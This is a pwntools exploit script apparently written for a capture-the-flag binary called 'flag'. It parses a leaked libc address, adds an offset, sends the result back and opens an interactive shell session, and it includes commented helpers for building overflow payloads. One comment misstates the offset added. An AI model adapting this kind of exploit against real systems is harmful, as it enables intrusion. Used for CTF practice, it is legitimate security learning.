#!/usr/bin/env python3
import sys
import os

from pwn import *

context.update(arch='x86_64', os='linux')
    
#initialize payload
payload = ''

''' useful commands to construct payloads '''

''' create payload of 24 bytes of non-repeating, searchable 4-byte sequences '''
#payload  = cyclic( 24 )

''' create payload of X bytes, where X is number of bytes until reaching 0x61616164 '''
#payload  = cyclic(   cyclic_find( 0x61616164  )  )
''' (alternate form using strings instead of hex/character code '''
#payload  = cyclic(   cyclic_find( 'daaa' )  )

''' append byte-formatted string for hex number 0xdeadbeef to payload '''
#payload += p64( 0xdeadbeef  )

'''send a single null byte using python bytes() format '''
#payload = b'\x00'

''' create payload of 16 0x90 bytes '''
#payload = b'\x90'*16


'''don't change any of this, there is no reason to'''
if (len(sys.argv)<= 1):
    p = process(os.getcwd() + "/flag")
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([os.getcwd() + "/flag"],'''
    unset env LINES
    unset env COLUMNS
    break main
    continue
    ''')


''' potentially useful command for some tasks to get output of a binary process: '''

''' get a single line of output from process '''
#output = p.recv()

''' get all output from process (note: sometimes this hangs so not always best solution) '''
#output = p.recvall()

''' gets all text up until a certain string pattern, (NOTE: this will hang if the string is never seen by the process '''
output = p.recvuntil("Feed Me A Stray String:")

# Extract the leaked libc address as a string
libc_address_line = output.splitlines()[-2]  # The address line is usually the second-to-last line
libc_address_hex = libc_address_line.strip()  # Remove leading/trailing whitespace

# Decode the bytes to a string and remove the "0x" prefix
libc_address_hex = libc_address_hex.decode()
libc_address_hex = libc_address_hex[0:]

# Modify the libc address (for example, add 0x1000 to it)
modified_address = hex(int(libc_address_hex, 16) + 0x1d70)  # Add 0x1000 to the address

# Send the modified data back to the target as a string without '0x' prefix
p.sendline(modified_address)





#p.sendline(payload)


p.interactive()
